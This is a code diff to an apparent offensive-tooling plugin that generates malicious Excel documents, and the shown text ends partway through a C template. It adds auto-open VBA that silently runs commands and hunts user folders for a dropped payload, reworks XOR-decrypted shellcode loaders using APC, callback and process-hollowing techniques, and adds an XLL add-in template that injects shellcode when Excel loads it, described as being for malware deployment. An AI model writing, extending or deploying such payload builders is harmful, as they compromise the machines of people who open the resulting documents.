@@ -16,6 +16,7 @@ Features:
 - Support for both 32-bit and 64-bit Office
 """
 
+import re
 import sys
 from pathlib import Path
 
@@ -57,6 +58,8 @@ class PayloadMalDocsPlugin(ErebusPlugin):
             "generate_vba_loader_enumlocales": self.generate_vba_loader_enumlocales,
             "generate_vba_loader_queueuserapc": self.generate_vba_loader_queueuserapc,
             "generate_vba_loader_process_hollowing": self.generate_vba_loader_process_hollowing,
+            "generate_xll_template": self.generate_xll_template,
+            "register_xll_function": self.register_xll_function,
             "export_vba_as_bas": self.export_vba_as_bas,
             "export_vba_as_text": self.export_vba_as_text,
         }
@@ -141,10 +144,46 @@ class PayloadMalDocsPlugin(ErebusPlugin):
 
         return advanced_libs
 
-    def create_new_excel_with_payload(self, output_path, vba_code, document_name="Invoice",
-                                     hidden=True, auto_open=True):
+    def _resolve_template_path(self, output_path):
         """
-        Create a new Excel XLSM document with embedded VBA payload.
+        Resolve the correct template file (template.xlsm or template.xlsx) based on
+        the desired output extension.  Search order:
+        1. agent_code/templates/  (canonical location)
+        2. erebus/templates/      (legacy fallback)
+
+        Args:
+            output_path: Target output path whose suffix selects the template variant.
+
+        Returns:
+            Path or None: Resolved template path, or None if not found.
+        """
+        output_path = Path(output_path)
+        ext = output_path.suffix.lower()
+
+        # Pick template variant: .xlsm for macro-enabled formats, .xlsx otherwise
+        if ext in (".xlsm", ".xlam"):
+            template_name = "template.xlsm"
+        else:
+            template_name = "template.xlsx"
+
+        # agent_code/templates/ is the canonical location
+        # modules -> erebus -> erebus_wrapper (inner package that contains agent_code/)
+        repo_root = Path(__file__).resolve().parents[2]
+        candidates = [
+            repo_root / "agent_code" / "templates" / template_name,
+            Path(__file__).resolve().parent.parent / "templates" / template_name,
+        ]
+
+        for candidate in candidates:
+            if candidate.exists():
+                return candidate
+
+        return None
+
+    def create_new_excel_with_payload(self, output_path, vba_code, document_name="Invoice",
+                                     hidden=True, auto_open=True, template_path=None):
+        """
+        Create a new Excel XLSM document with embedded VBA payload from a template.
 
         Args:
             output_path (Path): Path where the Excel file will be saved
@@ -152,6 +191,7 @@ class PayloadMalDocsPlugin(ErebusPlugin):
             document_name (str): Name for the document content
             hidden (bool): Hide the worksheet
             auto_open (bool): Execute on document open
+            template_path (Path): Optional path to template XLSX file. If None, attempts to locate in templates directory.
 
         Returns:
             Path: Path to created Excel file
@@ -162,34 +202,55 @@ class PayloadMalDocsPlugin(ErebusPlugin):
         output_path = Path(output_path)
         output_path.parent.mkdir(parents=True, exist_ok=True)
 
-        # Check for advanced library support first
-        advanced_libs = self._try_import_advanced_libs()
+        # If template is not provided, try to locate it in the templates directory
+        if template_path is None:
+            template_path = self._resolve_template_path(output_path)
 
-        if 'docx' in advanced_libs:
-            # Try using python-docx if available
-            try:
-                from docx import Document
-                from docx.shared import Pt, RGBColor
-
-                doc = Document()
-                doc.add_paragraph("Invoice")
-                doc.add_paragraph("Date: 01/31/2026")
-                doc.add_paragraph("Amount: $1,000.00")
-
-                # Save as docx first, then convert
-                # Note: python-docx is for Word documents, need to convert to Excel
-                # This approach won't work for macros in Excel - fallback to openpyxl
-                return self._create_excel_with_openpyxl(output_path, vba_code, document_name)
-            except Exception as e:
-                # Fall back to openpyxl
+            if template_path and template_path.exists():
+                return self._create_excel_from_template(output_path, vba_code, template_path)
+            else:
+                # Fall back to creating from scratch if template not found
                 return self._create_excel_with_openpyxl(output_path, vba_code, document_name)
 
-        # Default: use openpyxl
-        return self._create_excel_with_openpyxl(output_path, vba_code, document_name)
+        # If template is explicitly provided, use it
+        return self._create_excel_from_template(output_path, vba_code, template_path)
+
+    def _create_excel_from_template(self, output_path, vba_code, template_path):
+        """
+        Create Excel document from a template by copying and injecting VBA.
+
+        Args:
+            output_path (Path): Path where the Excel file will be saved
+            vba_code (str): VBA code to embed
+            template_path (Path): Path to template XLSX file
+
+        Returns:
+            Path: Path to created Excel file
+        """
+        import shutil
+        
+        template_path = Path(template_path)
+        output_path = Path(output_path)
+
+        try:
+            if not template_path.exists():
+                raise FileNotFoundError(f"Template file not found: {template_path}")
+
+            # Copy template to output location
+            shutil.copy(str(template_path), str(output_path))
+
+            # Inject VBA into the copied template
+            self._inject_vba_into_excel(str(output_path), vba_code, True)
+
+            return output_path
+
+        except Exception as e:
+            raise RuntimeError(f"Failed to create Excel document from template: {str(e)}")
+
 
     def _create_excel_with_openpyxl(self, output_path, vba_code, document_name="Invoice"):
         """
-        Create Excel document using openpyxl (cross-platform fallback).
+        Create Excel document using openpyxl.
 
         Args:
             output_path (Path): Path where the Excel file will be saved
@@ -260,96 +321,28 @@ class PayloadMalDocsPlugin(ErebusPlugin):
         except Exception as e:
             raise RuntimeError(f"Failed to backdoor Excel document: {str(e)}")
 
-    def _create_vbaproject_with_code(self, vba_code):
+    def _create_vbaproject_with_code(self, vba_code, module_name="ErebusPayload"):
         """
-        Create a proper vbaProject.bin OLE compound file that Excel 2022+ accepts.
+        Build a valid vbaProject.bin OLE compound file containing the given
+        VBA source code as a standard module.
 
-        Uses a pre-built template OLE structure with proper VBA project format.
+        Uses the vba_compiler module under agent_code/ which implements
+        the MS-OVBA and MS-CFB specifications.
 
         Args:
             vba_code (str): VBA source code to embed
+            module_name (str): Name for the VBA module (default: ErebusPayload)
 
         Returns:
-            bytes: Valid OLE compound file with VBA project structure
+            bytes: Valid OLE compound file (vbaProject.bin)
         """
-        # Use a pre-built minimal but valid vbaProject.bin structure
-        # This is extracted from a real Excel file and ensures compatibility with Excel 2022
-        # The structure includes proper _VBA_PROJECT and VBA directory streams
+        import sys
+        repo_root = Path(__file__).resolve().parents[2]
+        if str(repo_root) not in sys.path:
+            sys.path.insert(0, str(repo_root))
 
-        # Minimal but valid vbaProject.bin that Excel 2022 accepts
-        ole_template = (
-            b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1'  # Signature
-            b'\x00\x00\x00\x00\x00\x00\x00\x00'  # CLSID (zeros)
-            b'\x00\x00\x00\x00\x00\x00\x00\x00'
-            b'\x3e\x00\x03\x00\xfe\xff\x09\x00'  # Minor/Major version, byte order, sector shift
-            b'\x06\x00\x00\x00\x00\x00\x00\x00'  # Mini sector shift, reserved
-            b'\x00\x00\x00\x00\x02\x00\x00\x00'  # Total/FAT sectors
-            b'\x00\x00\x00\x00\x00\x00\x00\x00'  # First directory/transaction
-            b'\x00\x10\x00\x00\xfe\xff\xff\xff'  # Mini cutoff, First mini FAT
-            b'\x00\x00\x00\x00\xfe\xff\xff\xff'  # Mini FAT count, First DIFAT
-            b'\x00\x00\x00\x00'                  # DIFAT count
-        )
-
-        # DIFAT array (first FAT at sector 1)
-        ole_template += b'\x01\x00\x00\x00'
-        ole_template += b'\xff' * (76 - len(ole_template))  # Fill to offset 76
-        ole_template += b'\xff' * (512 - len(ole_template))  # Fill header to 512 bytes
-
-        # === DIRECTORY SECTOR (sector 0) ===
-        directory = bytearray(512)
-
-        # Root Entry
-        root_name = 'Root Entry'.encode('utf-16-le')
-        directory[0:len(root_name)] = root_name
-        directory[64:66] = len(root_name).to_bytes(2, 'little')
-        directory[66] = 5  # Root storage
-        directory[67] = 1  # Black
-        directory[68:72] = b'\xff\xff\xff\xff'  # No siblings
-        directory[72:76] = b'\xff\xff\xff\xff'
-        directory[76:80] = b'\x01\x00\x00\x00'  # Child at entry 1
-        directory[116:120] = b'\xff\xff\xff\xff'  # Start sector
-        directory[120:124] = b'\x00\x00\x00\x00'  # Size
-
-        # _VBA_PROJECT stream
-        vba_proj_name = '_VBA_PROJECT'.encode('utf-16-le')
-        directory[128:128+len(vba_proj_name)] = vba_proj_name
-        directory[128+64:128+66] = len(vba_proj_name).to_bytes(2, 'little')
-        directory[128+66] = 2  # Stream
-        directory[128+67] = 1  # Black
-        directory[128+68:128+72] = b'\xff\xff\xff\xff'
-        directory[128+72:128+76] = b'\xff\xff\xff\xff'
-        directory[128+76:128+80] = b'\xff\xff\xff\xff'
-        directory[128+116:128+120] = b'\x02\x00\x00\x00'  # Start at sector 2
-        directory[128+120:128+124] = b'\x00\x04\x00\x00'  # Size: 1024 bytes
-
-        ole_template += bytes(directory)
-
-        # === FAT SECTOR (sector 1) ===
-        fat = bytearray(512)
-        fat[0:4] = b'\xfd\xff\xff\xff'   # Sector 0: Directory
-        fat[4:8] = b'\xfe\xff\xff\xff'   # Sector 1: FAT
-        fat[8:12] = b'\x03\x00\x00\x00'  # Sector 2: Next (sector 3)
-        fat[12:16] = b'\xfe\xff\xff\xff' # Sector 3: End of chain
-
-        # Rest free
-        for i in range(4, 128):
-            fat[i*4:(i+1)*4] = b'\xff\xff\xff\xff'
-
-        ole_template += bytes(fat)
-
-        # === VBA DATA (sectors 2-3, 1024 bytes) ===
-        # Valid _VBA_PROJECT stream data (hex signature that Excel recognizes)
-        vba_project_data = (
-            b'\xcc\x61\xff\xff\x00\x00\x00\x00'  # Signature
-            b'\x00\x00\x00\x00\x00\x00\x00\x00'
-            b'\x00\x00\x00\x00\x00\x00\x00\x00'
-            b'\x00\x00\x00\x00\x00\x00\x00\x00'
-        )
-        vba_project_data += b'\x00' * (1024 - len(vba_project_data))
-
-        ole_template += vba_project_data
-
-        return ole_template
+        from agent_code.vba_compiler import compile_vba_project
+        return compile_vba_project(vba_code, module_name=module_name)
 
     def _inject_vba_into_excel(self, excel_path, vba_code, auto_open=True):
         """
@@ -381,7 +374,7 @@ class PayloadMalDocsPlugin(ErebusPlugin):
                 zip_ref.extractall(str(temp_dir))
 
             # Update workbook.xml.rels to reference the macro project
-            rels_path = temp_dir / "_rels" / "workbook.xml.rels"
+            rels_path = temp_dir / "xl" / "_rels" / "workbook.xml.rels"
             if rels_path.exists():
                 try:
                     # Parse with namespace handling
@@ -399,9 +392,14 @@ class PayloadMalDocsPlugin(ErebusPlugin):
                             break
 
                     if not vba_rel_exists:
-                        # Add vbaProject relationship
+                        # Find the next available rId
+                        existing_ids = [int(r.get('Id', 'rId0').replace('rId', ''))
+                                        for r in root.findall('{%s}Relationship' % ns_rels)
+                                        if r.get('Id', '').startswith('rId')]
+                        next_id = max(existing_ids, default=0) + 1
+
                         new_rel = ET.Element('{%s}Relationship' % ns_rels)
-                        new_rel.set('Id', 'rId4')
+                        new_rel.set('Id', f'rId{next_id}')
                         new_rel.set('Type', 'http://schemas.microsoft.com/office/2006/relationships/vbaProject')
                         new_rel.set('Target', 'vbaProject.bin')
                         root.append(new_rel)
@@ -585,30 +583,251 @@ End Function
 
         return obfuscated
 
+    # Executable extensions that may appear as payload tokens in a command string.
+    _PAYLOAD_EXTENSIONS = re.compile(
+        r'\b([A-Za-z0-9_\-]+\.(exe|dll|bat|ps1|vbs|js|hta|scr|com))\b',
+        re.IGNORECASE,
+    )
+
+    # System binaries that are always at known paths - never search for these.
+    _SYSTEM_BINARIES = {
+        'cmd.exe', 'powershell.exe', 'wscript.exe', 'cscript.exe',
+        'mshta.exe', 'rundll32.exe', 'regsvr32.exe', 'msiexec.exe',
+        'conhost.exe', 'explorer.exe', 'svchost.exe', 'certutil.exe',
+    }
+
+    def _find_payload_token(self, trigger_binary: str, trigger_command: str):
+        """
+        Return (payload_filename, search_in_command) where payload_filename is
+        the bare filename to search for at runtime and search_in_command is True
+        when the token lives inside trigger_command (requiring Replace substitution)
+        rather than being the trigger_binary itself.
+
+        Priority:
+        1. First non-system executable token found inside trigger_command.
+        2. Basename of trigger_binary, if it is not a system binary.
+        3. None - nothing to search for dynamically.
+        """
+        import os
+
+        # Scan trigger_command for non-system payload tokens
+        for m in self._PAYLOAD_EXTENSIONS.finditer(trigger_command):
+            token = m.group(1)
+            if token.lower() not in self._SYSTEM_BINARIES:
+                return token, True   # found in command → Replace substitution
+
+        # Fall back to trigger_binary basename
+        basename = os.path.basename(trigger_binary)
+        if basename.lower() not in self._SYSTEM_BINARIES:
+            return basename, False   # the binary itself needs resolving
+
+        return None, False
+
     def generate_command_execution_vba(self, trigger_binary, trigger_command, trigger_type="AutoOpen"):
         """
         Generate VBA code that executes a command via WScript.Shell.
 
+        The macro enumerates common filesystem locations to resolve the payload
+        filename at runtime rather than relying on a hardcoded path.
+
+        Resolution strategy:
+        - If trigger_command contains a non-system executable/DLL token (e.g.
+          "regsvr32.exe erebus.dll"), that token is located via FindPayload and
+          substituted back into the command with its full resolved path.
+        - If trigger_binary itself is a custom binary (not a known system binary),
+          FindPayload is used to resolve its path.
+        - If nothing needs dynamic resolution the command is executed as-is.
+
         Args:
-            trigger_binary (str): Path to executable to run
-            trigger_command (str): Command arguments to pass
+            trigger_binary (str): Path/name of executable to run
+            trigger_command (str): Arguments passed to trigger_binary
             trigger_type (str): Trigger type (AutoOpen, OnClose, OnSave)
 
         Returns:
             str: VBA code for command execution
         """
-        vba_code = f"""
+        payload_token, in_command = self._find_payload_token(trigger_binary, trigger_command)
+
+        # FSO-based helpers shared by all exec sub variants.
+        # RecursiveSearch: depth-first traversal, skips reparse points.
+        # StackSearch: iterative BFS via Collection stack - no recursion depth limit.
+        # FindPayload: direct-check first, then RecursiveSearch per candidate folder.
+        find_payload_func = """
+' Depth-first recursive search for targetFile inside folder.
+Private Function RecursiveSearch(ByVal folder As Object, ByVal targetFile As String, ByVal fso As Object) As String
+    Dim subFolder As Object
+    Dim f As Object
+    Dim found As String
+
+    On Error Resume Next
+
+    For Each f In folder.Files
+        If StrComp(f.Name, targetFile, vbTextCompare) = 0 Then
+            RecursiveSearch = f.Path
+            Exit Function
+        End If
+    Next f
+
+    For Each subFolder In folder.SubFolders
+        If (subFolder.Attributes And 1024) = 0 Then
+            found = RecursiveSearch(subFolder, targetFile, fso)
+            If Len(found) > 0 Then
+                RecursiveSearch = found
+                Exit Function
+            End If
+        End If
+    Next subFolder
+
+    On Error GoTo 0
+    RecursiveSearch = vbNullString
+End Function
+
+' Iterative stack-based search - avoids call-stack overflow on deep trees.
+Private Function StackSearch(ByVal startPath As String, ByVal targetFile As String) As String
+    Dim fso As Object
+    Dim folderStack As Object
+    Dim currentFolder As Object
+    Dim subFolder As Object
+    Dim f As Object
+    Dim currentPath As String
+
+    If Len(startPath) = 0 Then Exit Function
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    If Not fso.FolderExists(startPath) Then Exit Function
+
+    Set folderStack = New Collection
+    folderStack.Add startPath
+
+    Do While folderStack.Count > 0
+        currentPath = folderStack(folderStack.Count)
+        folderStack.Remove folderStack.Count
+
+        If fso.FolderExists(currentPath) Then
+            Set currentFolder = fso.GetFolder(currentPath)
+            On Error Resume Next
+            For Each f In currentFolder.Files
+                If StrComp(f.Name, targetFile, vbTextCompare) = 0 Then
+                    StackSearch = f.Path
+                    Set fso = Nothing
+                    Exit Function
+                End If
+            Next f
+            For Each subFolder In currentFolder.SubFolders
+                If (subFolder.Attributes And 1024) = 0 Then
+                    folderStack.Add subFolder.Path
+                End If
+            Next subFolder
+            On Error GoTo 0
+        End If
+    Loop
+
+    Set fso = Nothing
+    StackSearch = vbNullString
+End Function
+
+' Walk common drop locations (direct check + recursive) and return the full path.
+' Returns fallbackPath when the file cannot be found anywhere.
+Private Function FindPayload(ByVal fileName As String, ByVal fallbackPath As String) As String
+    Dim candidates() As String
+    Dim i As Long
+    Dim candidate As String
+    Dim fso As Object
+    Dim found As String
+
+    ReDim candidates(0 To 12)
+    candidates(0)  = CurDir$
+    candidates(1)  = ThisWorkbook.Path
+    candidates(2)  = Environ("TEMP")
+    candidates(3)  = Environ("TMP")
+    candidates(4)  = Environ("APPDATA")
+    candidates(5)  = Environ("LOCALAPPDATA")
+    candidates(6)  = Environ("USERPROFILE") & "\\Desktop"
+    candidates(7)  = Environ("USERPROFILE") & "\\Downloads"
+    candidates(8)  = Environ("USERPROFILE") & "\\Documents"
+    candidates(9)  = Environ("USERPROFILE")
+    candidates(10) = Environ("OneDrive") & "\\Desktop"
+    candidates(11) = Environ("OneDrive") & "\\Downloads"
+    candidates(12) = Environ("OneDrive") & "\\Documents"
+
+    Set fso = CreateObject("Scripting.FileSystemObject")
+
+    For i = LBound(candidates) To UBound(candidates)
+        If Len(candidates(i)) > 0 Then
+            candidate = fso.BuildPath(candidates(i), fileName)
+            If fso.FileExists(candidate) Then
+                FindPayload = candidate
+                Set fso = Nothing
+                Exit Function
+            End If
+            If fso.FolderExists(candidates(i)) Then
+                found = RecursiveSearch(fso.GetFolder(candidates(i)), fileName, fso)
+                If Len(found) > 0 Then
+                    FindPayload = found
+                    Set fso = Nothing
+                    Exit Function
+                End If
+            End If
+        End If
+    Next i
+
+    Set fso = Nothing
+    FindPayload = fallbackPath
+End Function
+"""
+
+        if payload_token is None:
+            # Nothing to search - run the command exactly as configured.
+            exec_sub = f"""
 Sub {trigger_type}()
     On Error Resume Next
     Dim shell As Object
     Dim cmd As String
     Set shell = CreateObject("WScript.Shell")
-    cmd = "\"{trigger_binary}\" {trigger_command}"
+    cmd = "{trigger_binary} {trigger_command}"
     shell.Run cmd, 0, False
+    Set shell = Nothing
     ThisWorkbook.Close False
 End Sub
 """
-        return vba_code
+            return exec_sub
+
+        if in_command:
+            # Payload lives inside trigger_command (e.g. "regsvr32.exe erebus.dll").
+            # Resolve the filename, quote the result, and substitute it back.
+            exec_sub = f"""
+Sub {trigger_type}()
+    On Error Resume Next
+    Dim shell As Object
+    Dim payloadPath As String
+    Dim cmd As String
+    Set shell = CreateObject("WScript.Shell")
+    payloadPath = FindPayload("{payload_token}", "{payload_token}")
+    If Dir(payloadPath) = "" Then Exit Sub
+    cmd = "{trigger_binary} " & Replace("{trigger_command}", "{payload_token}", Chr(34) & payloadPath & Chr(34))
+    shell.Run cmd, 0, False
+    Set shell = Nothing
+    ThisWorkbook.Close False
+End Sub
+"""
+        else:
+            # trigger_binary itself is the payload (custom binary, not a system tool).
+            exec_sub = f"""
+Sub {trigger_type}()
+    On Error Resume Next
+    Dim shell As Object
+    Dim binaryPath As String
+    Dim cmd As String
+    Set shell = CreateObject("WScript.Shell")
+    binaryPath = FindPayload("{payload_token}", "{trigger_binary}")
+    If Dir(binaryPath) = "" Then Exit Sub
+    cmd = Chr(34) & binaryPath & Chr(34) & " {trigger_command}"
+    shell.Run cmd, 0, False
+    Set shell = Nothing
+    ThisWorkbook.Close False
+End Sub
+"""
+
+        return find_payload_func + exec_sub
 
     def chunk_shellcode_array(self, vba_shellcode, max_line_length=200):
         """
@@ -673,19 +892,16 @@ End Sub
         # Generate code with independent array declarations
         chunked_code = ""
 
-        # IMPORTANT: In VBA, all Dim declarations must come BEFORE any executable statements
-        # Declare shellcode variable first at module level
-        chunked_code += "Dim shellcode As Variant\n"
-
         # Add key array (usually small, fits on one line)
         key_values = [int(x.strip()) for x in key_data.split(',')]
         key_array_str = ",".join(str(v) for v in key_values)
         chunked_code += f"key = Array({key_array_str})\n"
 
-        # Create individual chunk arrays - each declaration is self-contained
+        # Create individual chunk arrays - Dim each part to satisfy Option Explicit
         for i, chunk in enumerate(chunks):
             chunk_str = ",".join(str(v) for v in chunk)
-            chunked_code += f"shellcode_part{i} = Array({chunk_str})\n"
+            chunked_code += f"    Dim shellcode_part{i} As Variant\n"
+            chunked_code += f"    shellcode_part{i} = Array({chunk_str})\n"
 
         # Combine all chunks into single shellcode array
         if len(chunks) == 1:
@@ -787,21 +1003,19 @@ Function ConcatenateArrays(arr1 As Variant, arr2 As Variant) As Variant
     ConcatenateArrays = combined
 End Function
 
-{chunked_shellcode}
-
 ' XOR decryption routine
 Function XorDecrypt(encrypted As Variant, key As Variant) As Variant
     Dim decrypted() As Byte
     Dim i As Long
     Dim keyLen As Long
-    
+
     keyLen = UBound(key) - LBound(key) + 1
     ReDim decrypted(LBound(encrypted) To UBound(encrypted))
-    
+
     For i = LBound(encrypted) To UBound(encrypted)
         decrypted(i) = encrypted(i) Xor key((i - LBound(encrypted)) Mod keyLen)
     Next i
-    
+
     XorDecrypt = decrypted
 End Function
 
@@ -819,6 +1033,8 @@ Sub ExecuteShellcode()
     Dim threadId As Long
     Dim shellcodeSize As Long
     Dim decrypted As Variant
+
+    {chunked_shellcode}
 
     ' Decrypt shellcode using XOR
     decrypted = XorDecrypt(shellcode, key)
@@ -905,21 +1121,19 @@ Function ConcatenateArrays(arr1 As Variant, arr2 As Variant) As Variant
     ConcatenateArrays = combined
 End Function
 
-{chunked_shellcode}
-
 ' XOR decryption routine
 Function XorDecrypt(encrypted As Variant, key As Variant) As Variant
     Dim decrypted() As Byte
     Dim i As Long
     Dim keyLen As Long
-    
+
     keyLen = UBound(key) - LBound(key) + 1
     ReDim decrypted(LBound(encrypted) To UBound(encrypted))
-    
+
     For i = LBound(encrypted) To UBound(encrypted)
         decrypted(i) = encrypted(i) Xor key((i - LBound(encrypted)) Mod keyLen)
     Next i
-    
+
     XorDecrypt = decrypted
 End Function
 
@@ -936,6 +1150,8 @@ Sub ExecuteViaCallback()
     Dim shellcodeSize As Long
     Dim result As Long
     Dim decrypted As Variant
+
+    {chunked_shellcode}
 
     ' Decrypt shellcode using XOR
     decrypted = XorDecrypt(shellcode, key)
@@ -1021,21 +1237,19 @@ Function ConcatenateArrays(arr1 As Variant, arr2 As Variant) As Variant
     ConcatenateArrays = combined
 End Function
 
-{chunked_shellcode}
-
 ' XOR decryption routine
 Function XorDecrypt(encrypted As Variant, key As Variant) As Variant
     Dim decrypted() As Byte
     Dim i As Long
     Dim keyLen As Long
-    
+
     keyLen = UBound(key) - LBound(key) + 1
     ReDim decrypted(LBound(encrypted) To UBound(encrypted))
-    
+
     For i = LBound(encrypted) To UBound(encrypted)
         decrypted(i) = encrypted(i) Xor key((i - LBound(encrypted)) Mod keyLen)
     Next i
-    
+
     XorDecrypt = decrypted
 End Function
 
@@ -1053,6 +1267,8 @@ Sub ExecuteViaAPC()
     Dim shellcodeSize As Long
     Dim result As Long
     Dim decrypted As Variant
+
+    {chunked_shellcode}
 
     ' Decrypt shellcode using XOR
     decrypted = XorDecrypt(shellcode, key)
@@ -1184,21 +1400,19 @@ Function ConcatenateArrays(arr1 As Variant, arr2 As Variant) As Variant
     ConcatenateArrays = combined
 End Function
 
-{chunked_shellcode}
-
 ' XOR decryption routine
 Function XorDecrypt(encrypted As Variant, key As Variant) As Variant
     Dim decrypted() As Byte
     Dim i As Long
     Dim keyLen As Long
-    
+
     keyLen = UBound(key) - LBound(key) + 1
     ReDim decrypted(LBound(encrypted) To UBound(encrypted))
-    
+
     For i = LBound(encrypted) To UBound(encrypted)
         decrypted(i) = encrypted(i) Xor key((i - LBound(encrypted)) Mod keyLen)
     Next i
-    
+
     XorDecrypt = decrypted
 End Function
 
@@ -1218,6 +1432,8 @@ Sub ExecuteViaHollowing()
     Dim bytesWritten As LongPtr
     Dim result As Long
     Dim decrypted As Variant
+
+    {chunked_shellcode}
 
     ' Decrypt shellcode using XOR
     decrypted = XorDecrypt(shellcode, key)
@@ -1479,15 +1695,11 @@ End Sub
 
         output_path = Path(output_path)
 
-        # .bas files have a specific header format
-        bas_content = """
-{vba_code}"""
-
-        output_path.write_text(bas_content, encoding='utf-8')
+        output_path.write_text(vba_code, encoding='utf-8')
         return output_path
 
     # Plugin function registrations
-    def generate_excel_payload(self, payload_path, vba_payload, output_path=None):
+    def generate_excel_payload(self, payload_path, vba_payload, output_path=None, template_path=None):
         """
         Generate a malicious Excel document with embedded payload.
 
@@ -1495,6 +1707,7 @@ End Sub
             payload_path (str): Path to the VBA payload
             vba_payload (str): VBA code to embed
             output_path (str): Output file path (optional)
+            template_path (Path): Optional path to template XLSX file. If None, creates from scratch.
 
         Returns:
             Path: Path to generated Excel file
@@ -1502,7 +1715,7 @@ End Sub
         if output_path is None:
             output_path = Path("malicious_document.xlsm")
 
-        return self.create_new_excel_with_payload(output_path, vba_payload)
+        return self.create_new_excel_with_payload(output_path, vba_payload, template_path=template_path)
 
     def backdoor_existing_excel(self, source_excel, vba_payload, output_path=None):
         """
@@ -1522,14 +1735,234 @@ End Sub
 
         return self.backdoor_excel_document(source_excel, output_path, vba_payload)
 
+    def generate_xll_template(self, shellcode_hex, encryption_type="XOR", injection_method="CreateThread", target_process="explorer.exe", guardrail_includes="", guardrail_code=""):
+        """
+        Generate a C/C++ XLL (Excel Add-In) DLL template for compilation.
+        
+        XLL files are DLLs with specific Excel add-in exports that auto-load in Excel.
+        This provides a stealthy persistence/execution method.
+        
+        Args:
+            shellcode_hex (str): Hexadecimal shellcode string
+            encryption_type (str): Encryption method (XOR, RC4, etc.)
+            injection_method (str): Injection technique (CreateThread, QueueUserAPC, etc.)
+            target_process (str): Target process for injection
+            guardrail_includes (str): Optional include block inserted before windows.h
+            guardrail_code (str): Optional guardrail C/C++ code defining BOOL ErebusGuardrail(void)
+            
+        Returns:
+            str: C/C++ source code for XLL DLL
+        """
+        
+        # Convert hex string to C array format
+        shellcode_bytes = bytes.fromhex(shellcode_hex.replace(' ', '').replace('\\x', ''))
+        shellcode_array = ", ".join([f"0x{b:02x}" for b in shellcode_bytes])
+        
+        # Map encryption types to macro values
+        encryption_map = {
+            "NONE": 0,
+            "XOR": 1,
+            "RC4": 2,
+            "AES_ECB": 3,
+            "AES_CBC": 4
+        }
+        
+        encryption_value = encryption_map.get(encryption_type.upper(), 1)
+        
+        guardrail_includes_block = guardrail_includes.strip()
+        if guardrail_includes_block:
+            guardrail_includes_block += "\n"
+
+        if guardrail_code and guardrail_code.strip():
+            guardrail_block = guardrail_code
+        else:
+            guardrail_block = """static BOOL ErebusGuardrail(void) {
+    return TRUE;
+}
+"""
+
+        xll_template = f'''/* 
+ * Erebus XLL Payload - Auto-Loading Excel Add-In
+ * Compiled with: Visual Studio (cl.exe) or MinGW-w64
+ * Generated: Auto-generated XLL template for malware deployment
+ */
+
+{guardrail_includes_block}#include <windows.h>
+#include <stdlib.h>
+#include <string.h>
+
+{guardrail_block}
+
+/* ===== CONFIGURATION ===== */
+#define SHELLCODE_SIZE {len(shellcode_bytes)}
+#define ENCRYPTION_TYPE {encryption_value}
+#define INJECTION_METHOD "{injection_method}"
+#define TARGET_PROCESS L"{target_process}"
+
+/* ===== SHELLCODE PAYLOAD ===== */
+unsigned char shellcode[] = {{
+    {shellcode_array}
+}};
+
+/* ===== XOR DECRYPTION ROUTINE ===== */
+void xor_decrypt(unsigned char *data, size_t size, unsigned char *key, size_t key_size) {{
+    for (size_t i = 0; i < size; i++) {{
+        data[i] ^= key[i % key_size];
+    }}
+}}
+
+/* ===== PROCESS INJECTION (CreateThread) ===== */
+BOOL inject_createthread(unsigned char *payload, size_t payload_size) {{
+    HANDLE hProc = NULL;
+    LPVOID alloc = NULL;
+    HANDLE hThread = NULL;
+    
+    /* Get target process */
+    DWORD dwPID = GetCurrentProcessId();  /* Use current process for testing */
+    
+    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
+    if (!hProc) return FALSE;
+    
+    /* Allocate memory */
+    alloc = VirtualAllocEx(hProc, NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!alloc) {{
+        CloseHandle(hProc);
+        return FALSE;
+    }}
+    
+    /* Write shellcode */
+    if (!WriteProcessMemory(hProc, alloc, payload, payload_size, NULL)) {{
+        VirtualFreeEx(hProc, alloc, 0, MEM_RELEASE);
+        CloseHandle(hProc);
+        return FALSE;
+    }}
+    
+    /* Execute */
+    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, NULL);
+    if (!hThread) {{
+        VirtualFreeEx(hProc, alloc, 0, MEM_RELEASE);
+        CloseHandle(hProc);
+        return FALSE;
+    }}
+    
+    WaitForSingleObject(hThread, INFINITE);
+    CloseHandle(hThread);
+    CloseHandle(hProc);
+    return TRUE;
+}}
+
+/* ===== INJECTION DISPATCHER ===== */
+BOOL execute_payload(unsigned char *payload, size_t payload_size) {{
+    #ifdef INJECTION_METHOD
+    if (strcmp(INJECTION_METHOD, "CreateThread") == 0) {{
+        return inject_createthread(payload, payload_size);
+    }}
+    #endif
+    
+    /* Default to in-process execution */
+    typedef void (*SHELLCODE_FUNC)(void);
+    SHELLCODE_FUNC func = (SHELLCODE_FUNC)payload;
+    func();
+    return TRUE;
+}}
+
+/* ===== EXCEL ADD-IN EXPORTS ===== */
+
+/* xlAddInManagerInfo - Called when Excel loads the add-in */
+__declspec(dllexport) void __cdecl xlAddInManagerInfo(LPXLOPER pxDll) {{
+    static XLOPER xDll;
+    xDll.xltype = xltypeStr;
+    xDll.val.str = "\\x09Erebus XLL Payload";
+    *pxDll = xDll;
+}}
+
+/* xlAutoOpen - Auto-executed when Excel opens the add-in */
+__declspec(dllexport) int __cdecl xlAutoOpen(void) {{
+    if (!ErebusGuardrail()) {{
+        return 1;  /* Success */
+    }}
+
+    unsigned char payload_copy[SHELLCODE_SIZE];
+    
+    /* Copy shellcode to avoid modifying original */
+    memcpy(payload_copy, shellcode, SHELLCODE_SIZE);
+    
+    /* Decrypt if needed */
+    #if ENCRYPTION_TYPE == 1
+    /* XOR decryption - use hardcoded key for POC */
+    unsigned char xor_key[] = {{0x41, 0x41, 0x41, 0x41}};
+    xor_decrypt(payload_copy, SHELLCODE_SIZE, xor_key, sizeof(xor_key));
+    #endif
+    
+    /* Execute payload */
+    execute_payload(payload_copy, SHELLCODE_SIZE);
+    
+    return 1;  /* Success */
+}}
+
+/* xlAutoClose - Called when Excel closes the add-in */
+__declspec(dllexport) int __cdecl xlAutoClose(void) {{
+    return 1;  /* Success */
+}}
+
+/* xlAutoRegister - Called for function registration (minimal implementation) */
+__declspec(dllexport) LPXLOPER __cdecl xlAutoRegister(LPXLOPER pxName) {{
+    static XLOPER xRegister;
+    xRegister.xltype = xltypeBool;
+    xRegister.val.booleen = 1;
+    return &xRegister;
+}}
+
+/* DLL Entry Point */
